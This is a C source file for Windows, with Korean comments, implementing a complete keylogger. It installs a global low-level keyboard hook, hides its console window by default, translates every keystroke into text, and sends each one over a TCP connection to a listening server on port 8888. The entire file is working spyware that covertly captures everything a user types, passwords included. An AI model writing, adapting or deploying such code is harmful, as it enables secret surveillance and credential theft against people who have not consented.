
#define WIN32_LEAN_AND_MEAN
#define UNICODE
//#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512 // 기본 버퍼 길이 정의
#define DEFAULT_PORT "8888"

#define INVISIBLE

static const struct {
    int key;
    const char* name;
} keyname[] = {
    //{VK_BACK, "[BACKSPACE]"},
    {VK_BACK, "\b \b"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[SHIFT]"},
    {VK_RSHIFT, "[SHIFT]"},
    {VK_CONTROL, "[CTRL+"},
    {VK_LCONTROL, "[CTRL+"},
    {VK_RCONTROL, "[CTRL+"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}
};

HHOOK _hook;

int ctrl = 0;
int shift = 0;

KBDLLHOOKSTRUCT kbdStruct;

SOCKET ConnectSocket;


void SendtoServer(char* mes) {
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = send(ConnectSocket, mes, (int)strlen(mes), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return;

    }


    // 전송한 바이트 수 출력.
    //printf("Bytes Sent: %ld\n", iResult);

    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    if (iResult >= 0) {
        recvbuf[iResult] = '\0';
        printf("%s", recvbuf);
        //printf("shiftok");
        //printf("Received: %s\n", recvbuf);
        //printf("Bytes received: %d\n", iResult);
    }
    //else if (iResult == 0) return;
    else if (iResult < 0)
        printf("recv failed with error: %d\n", WSAGetLastError());

    return;

}

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    int i;
    int key_stroke;
    char output[256];

    if (nCode >= 0)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        key_stroke = kbdStruct.vkCode;
        HWND foreground = GetForegroundWindow();
        DWORD threadID;
        HKL layout = NULL;

        if (foreground)
        {
            // get keyboard layout of the thread
            threadID = GetWindowThreadProcessId(foreground, NULL);
            layout = GetKeyboardLayout(threadID);
        }

        //part1
        if (foreground)
        {
            char window_title[256];
            GetWindowTextA(foreground, (LPSTR)window_title, 256);
        }

        if (wParam == WM_KEYUP) {
            //printf("<%d>", key_stroke);
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (ctrl) {
                    sprintf(output, "]");
                    SendtoServer(output);
                    ctrl = FALSE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (shift) {
                    shift = FALSE;
                }
                break;
            }
        }

        if (wParam == WM_KEYDOWN) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrl) {
                    ctrl = TRUE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (!shift) {
                    shift = TRUE;
                }
                break;
            }

            //&& (GetAsyncKeyState(VK_MENU) & 0x8000)
            if (ctrl  && (key_stroke == 'Q')) {
                sprintf(output, "\n[QUIT]");
                SendtoServer(output);
                //fflush(output_file);
                //fclose(output_file); // 파일 핸들러를 닫음.
                PostQuitMessage(0); // 메시지 루프에 종료 메시지를 보냄.
                return -1; // 후킹 체인에 메시지 전달안함.
            }

            for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++) 
            {
                if (keyname[i].key == key_stroke) 
                {
                    sprintf(output, "%s", keyname[i].name);
                    break;
                }
            }
            

            if (i == sizeof(keyname) / sizeof(keyname[0]))
            {
                char key;
                key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
                
                if (shift && isdigit(key_stroke)) {

                    switch (key - 48) {
                    case 1:
                        key = '!';
                        break;
                    case 2:
                        key = '@';
                        break;
                    case 3:
                        key = '#';
                        break;
                    case 4:
                        key = '$';
                        break;
                    case 5:
                        key = '%';
                        break;
                    case 6:
                        key = '^';
                        break;
                    case 7:
                        key = '&';
                        break;
                    case 8:
                        key = '*';
                        break;
                    case 9:
                        key = '(';
                        break;
                    case 0:
                        key = ')';
                        break;
                    default: break;
                    }
                }
                else if (!isalpha(key_stroke) && shift)
                {
                    switch (key_stroke) {
                    case VK_OEM_PLUS:
                        key = '+';
                        break;
                    case VK_OEM_MINUS:
                        key = '_';
                        break;
                    case VK_OEM_PERIOD:
                        key = '>';
                        break;
                    case VK_OEM_2:
                        key = '?';
                        break;
                    case VK_OEM_COMMA:
                        key = '<';
                        break;
                    case VK_OEM_1:
                        key = ':';
                        break;
                    case VK_OEM_3:
                        key = '~';
                        break;
                    case VK_OEM_4:
                        key = '{';
                        break;
                    case VK_OEM_5:
                        key = '|';
                        break;
                    case VK_OEM_6:
                        key = '}';
                        break;
                    case VK_OEM_7:
                        key = '"';
                        break;
                    default:

                        break;
                    }
                }
                
                else {
                    int lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                    // check shift key
                    if (shift)
                    {
                        lowercase = !lowercase;
                    }

                    if (!lowercase)
                    {
                        key = tolower(key);
                    }
                }
                sprintf(output, "%c", key);

                
            }
            SendtoServer(output);
            
        }

    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() //후킹이 실패하였을 때 사용자에게 오류 메시지 표시함.
{

    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}


void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
    Stealth();

    WSADATA wsaData;
    ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char sendbuf[1024];
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Winsock 초기화
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    // addrinfo 구조체 초기화
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // 서버 주소와 포트 해석
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // 주소 목록을 순회하며 서버에 연동
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // 서버에 연결하기 위한 소켓 생성.
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // 서버에 연결 시도.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue; // 다음 주소로 시도
        }
        break; // 연결 성공
    }
    // 더 이상 필요 없는 주소 정보 해제.
    freeaddrinfo(result);
    printf("Client::Successful Connection!\n");
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();


    printf("\nConnection closed\n");
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}